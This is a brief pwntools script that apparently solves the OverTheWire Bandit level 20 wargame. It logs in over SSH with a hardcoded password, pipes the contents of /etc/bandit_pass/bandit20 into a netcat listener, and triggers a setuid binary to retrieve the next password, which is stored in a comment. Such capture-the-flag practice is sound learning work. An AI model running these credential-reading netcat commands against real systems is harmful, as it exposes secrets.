from pwn import *
import string
shell = ssh('bandit20', 'bandit.labs.overthewire.org',
    password='GbKksEFF4yrVs6il55v6gwY5aVje5f0j')
sh = shell.run('bash')
sh.recv(timeout=5).decode()

sh.sendline('cat /etc/bandit_pass/bandit20 | nc -l 65483 &')
sh.recv(timeout=5).decode()
sh.sendline('./suconnect 65483')
log.info(sh.recv(timeout=10).decode())
log.info(sh.recv(timeout=10).decode())
log.info(sh.recv(timeout=30).decode())



#pass gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
